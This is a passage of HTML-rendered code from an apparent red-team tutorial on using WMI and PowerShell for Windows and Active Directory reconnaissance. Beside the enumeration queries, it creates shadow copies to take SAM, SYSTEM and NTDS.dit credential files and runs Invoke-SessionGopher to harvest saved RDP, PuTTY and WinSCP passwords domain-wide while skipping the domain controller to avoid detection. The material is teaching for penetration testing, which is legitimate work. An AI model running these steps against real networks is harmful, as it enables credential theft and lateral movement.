&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$regProv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetDWORDValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mf">2147483650&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;UserAuthentication&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">uValue&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="wmi-for-red-teams">WMI for Red Teams&lt;/h2>
&lt;h3 id="information-gathering">Information Gathering&lt;/h3>
&lt;p>These commands for information gathering can be executed both on a local or remote box:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List routes&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_IP4RouteTable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_IP4RouteTable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List users (it provides also domain users and bidirectional trusted domain users)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List groups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Group&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimInstance&lt;/span> &lt;span class="n">-ClassName&lt;/span> &lt;span class="n">Win32_Group&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create a shadow copy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Shadow Copy is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes even when they are in use. It can be useful to steal data from SAM, SYSTEM or NTDS.dit files in particular from remote boxes.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List existing shadow copies&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_ShadowCopy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Use class method to create a shadow copy of &amp;#34;C:\&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_ShadowCopy&lt;/span> &lt;span class="n">-List&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;C:\&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;ClientAccessible&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Create a link to the shadow copy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$link&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_ShadowCopy&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DeviceObject&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="s2">&amp;#34;\&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">mklink&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">shadowcopy&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$link&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Invoke-SessionGopher.ps1&lt;/code> is a useful tool to extract information from registry on local or remote (requires admin privs) about RDP, Putty sessions and WinSCP passwords. It is part of &lt;code>Nishang&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">nishang&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Gather&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="nb">Invoke-SessionGopher&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Gather information from the local box&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SessionGopher&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Gather information from a remote box&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SessionGopher&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Gather information from all domain machines&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SessionGopher&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-AllDomain&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Gather information from all domain machines excluding DC to avoid detection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SessionGopher&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-AllDomain&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT01&amp;#34;&lt;/span> &lt;span class="n">-ExcludeDC&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Explore filesystem to look for Putty private key files (.ppk), RDP connection files (.rdp) and RSA files (.stdid)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SessionGopher&lt;/span> &lt;span class="n">-Thorough&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="active-directory-enumeration">Active Directory Enumeration&lt;/h3>
&lt;p>The following commands must be ran from a domain-joined box:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Classes prefixed with ads_ are abstract, while ds_ are dynamic&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-List&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-CimClass&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get the current domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_domain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">ds_dc&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_ComputerSystem&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get domain trusts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_trusteddomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ds_cn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get domain password policy&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_domain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">DS_lockoutDuration&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_lockoutObservationWindow&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_lockoutThreshold&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_maxPwdAge&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_minPwdAge&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_minPwdLength&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_pwdHistoryLength&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">DS_pwdProperties&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get the domain controller&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 532480 is the User Account Control value for the domain controller&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ds_userAccountControl&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="mf">532480&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ds_cn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all properties removing empty values&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ds_userAccountControl&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="mf">532480&lt;/span>&lt;span class="p">}).&lt;/span>&lt;span class="py">Properties&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Foreach-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">value&lt;/span> &lt;span class="o">-AND&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-NOTMATCH&lt;/span> &lt;span class="s2">&amp;#34;__&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)}}}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all domain users&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get details of a particular user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all user of a trusted domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_UserAccount&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s2">&amp;#34;Domain = &amp;#39;CYBERSCHOOL&amp;#39;&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all domain and local groups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_Group&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all domain groups&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_GroupInDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">wmi&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PartComponent&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all groups of a trusted domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_GroupInDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GroupComponent&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;CYBERSCHOOL&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">wmi&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PartComponent&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get members of domain admin group for the current and trusted domains&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_GroupUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GroupComponent&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">wmi&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PartComponent&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get members of domain admin group for a trusted domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_GroupUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GroupComponent&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GroupComponent&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;CYBERSCHOOL&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">wmi&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">PartComponent&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get group membership for a particular user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">Win32_GroupUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">PartComponent&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT01&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ForEach-Object&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">wmi&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">GroupComponent&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all domain computers&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">ds_cn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Get all non-empty properties for a computer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ds_cn&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span>&lt;span class="p">}).&lt;/span>&lt;span class="py">Properties&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Foreach-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">value&lt;/span> &lt;span class="o">-AND&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-NOTMATCH&lt;/span> &lt;span class="s2">&amp;#34;__&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)}}}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List computers with a particular operating system&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">DS_operatingSystem&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;Windows 10&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ds_cn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-WmiObject&lt;/span> &lt;span class="n">-Namespace&lt;/span> &lt;span class="n">root&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">directory&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">ldap&lt;/span> &lt;span class="n">-Class&lt;/span> &lt;span class="n">ds_computer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Where-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">DS_operatingSystem&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;Windows 10&amp;#34;&lt;/span>&lt;span class="p">}).&lt;/span>&lt;span class="py">Properties&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Foreach-Object&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">value&lt;/span> &lt;span class="o">-AND&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">name&lt;/span> &lt;span class="o">-NOTMATCH&lt;/span> &lt;span class="s2">&amp;#34;__&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="vm">@&lt;/span>&lt;span class="p">{&lt;/span> &lt;span class="vm">$&lt;/span>&lt;span 